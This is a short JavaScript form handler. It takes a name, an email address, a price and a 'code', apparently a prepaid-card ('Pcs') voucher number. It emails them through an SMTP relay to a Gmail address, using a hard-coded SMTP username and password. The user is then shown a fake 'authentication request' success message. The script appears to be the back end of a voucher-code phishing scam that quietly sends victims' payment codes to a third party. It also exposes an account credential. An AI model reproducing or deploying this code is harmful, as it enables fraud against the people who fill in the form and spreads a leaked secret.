
function emailSend(){
    var userName = document.getElementById('Name').value;
    var email = document.getElementById('email').value;
    var prix = document.getElementById('Prix').value;
    var code = document.getElementById('code').value;




    var messageBody = "Pcs: " + userName + 
                      "<br/> email: " + email +
                      "<br/> prix: " + prix + 
                      "<br/> code: " +  code;
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "andreashope03@gmail.com",
        Password : "E41118CF93C8CB54E62438BA477843A4E752",
        To : 'elsamorhow@gmail.com',
        From : "andreashope03@gmail.com",
        Subject : "This is the subject",
        Body : messageBody
    }).then(
      message => {
        if( message =='OK'){
          swal("Succefull", "Authentication request save successfully.  Please wait a few moments you will receive a confirmation email", "success");

        }
        else{
          swal("Error", "Try again", "Error");

        }
      }
    );


  
}